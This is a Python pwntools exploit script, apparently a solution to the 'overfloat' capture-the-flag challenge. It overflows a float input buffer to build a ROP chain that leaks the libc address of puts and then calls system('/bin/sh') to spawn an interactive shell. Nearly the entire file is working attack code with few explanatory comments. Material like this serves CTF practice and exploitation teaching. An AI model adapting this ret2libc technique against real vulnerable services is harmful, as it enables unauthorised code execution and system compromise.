from pwn import *
import struct

# Establish values for the rop chain
putsPlt = 0x400690
putsGot = 0x602020
popRdi = 0x400a83

startMain = 0x400993

offsetSystem = 0x45880		# hex(libc_elf.symbols['system'])	
offsetBinsh = 0x194882		# hex(next(libc_elf.search(b'/bin/sh')))	


# Some helper functions to help with the float input
# These were made by qw3rty01
pf = lambda x: struct.pack('f', x)
uf = lambda x: struct.unpack('f', x)[0]

# Establish the target, and the libc file
#target = remote("challenges.fbctf.com", 1341)
target = process('./overfloat')

pid = util.proc.pidof(target)[0]
print("The pid is " + str(pid))
# util.proc.wait_for_debugger(pid)

# If for whatever reason you are using a different libc file, just change it out here and it should work
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# A helper function to send input, made by a team mate
def sendVal(x):
    v1 = x & ((2**32) - 1)  # v1 = 4 low bite of x
    v2 = x >> 32            # v2 = 4 high bite of x 
    target.sendline(str(uf(p32(v1))))
    target.sendline(str(uf(p32(v2))))

# Fill up the space between the start of our input and the return address
# buf  rbp-30h
# ret  rbp+8h
# input_len 38h(56)
for i in range(7):
    sendVal(0xdeadbeefdeadbeef)

# Send the rop chain to print libc address of puts
# then loop around to the start of main

#leak libc
sendVal(popRdi)
sendVal(putsGot)
sendVal(putsPlt)
sendVal(startMain)

# Send done so our code executes
target.sendline('done')

# Print out the target output
print(target.recvuntil('BON VOYAGE!\n'))

# Scan in, filter out the libc infoleak, calculate the base
leak = target.recv(6)
leak = u64(leak + b"\x00" * (8-len(leak)))
base = leak - libc.symbols['puts']

print("libc base: " + hex(base))

# Fill up the space between the start of our input and the retun address
# For the second round of exploiting the bug
for i in range(7):
    sendVal(0xdeadbeefdeadbeef)

systemLibc = base + offsetSystem
binshLibc = base + offsetBinsh
# Overwrite the return address with a onegadget
sendVal(popRdi)
sendVal(binshLibc)
sendVal(systemLibc)

# Send done so our rop chain executes
target.sendline('done')

target.interactive()
